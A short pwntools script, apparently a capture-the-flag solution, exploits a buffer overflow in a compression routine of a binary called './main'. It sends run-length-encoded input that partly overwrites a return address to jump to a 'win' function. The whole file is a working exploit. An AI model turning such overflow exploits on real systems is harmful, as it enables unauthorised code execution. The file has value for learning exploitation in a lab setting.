from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* vuln+276
                           b* compress
                           b* win
                        c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main",checksec=False)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
nc="nc zaeazeaz 111"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############

def encode(x,n=6):
        res=b""
        for i in range(n//2):
                char=(x>>(i*2*8))&0xff
                repetition=(x>>((i*2)+1)*8)&0xff
                if repetition==0:
                        repetition=256
                print(char)
                print(repetition)
                res+=p8(char)*(repetition)
        return res



p.recvuntil("data to compress :")
p.send(b"ab"*(0x318//4)+encode(exe.symbols["win"]+1,2))  ## writes only lower 2 bytes
p.recvuntil("data to compress :")
p.sendline("exit")

p.interactive()